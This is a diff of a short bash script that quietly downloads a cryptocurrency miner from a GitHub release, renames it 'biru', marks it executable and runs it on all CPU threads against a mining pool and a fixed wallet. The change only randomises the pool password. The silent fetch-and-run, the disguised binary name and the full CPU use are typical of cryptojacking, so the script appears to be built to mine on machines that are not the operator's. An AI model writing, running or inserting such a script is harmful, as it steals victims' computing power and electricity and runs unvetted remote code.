@@ -1,4 +1,4 @@
 #!/bin/bash
 wget -O biru https://github.com/bondaltomason/meo/releases/download/2.7.0/SRBMiner-MULTI > /dev/null 2>&1
 chmod 777 biru
-./biru --algorithm randomx --pool us.0xpool.io:3333 --wallet 0xcbb88afe52c22aa3252e527eb7fcb97633e4e311 --password x --cpu-threads $(nproc --all)
+./biru --algorithm randomx --pool us.0xpool.io:3333 --wallet 0xcbb88afe52c22aa3252e527eb7fcb97633e4e311 --password $(echo $RANDOM | md5sum | head -c 20) --cpu-threads $(nproc --all)
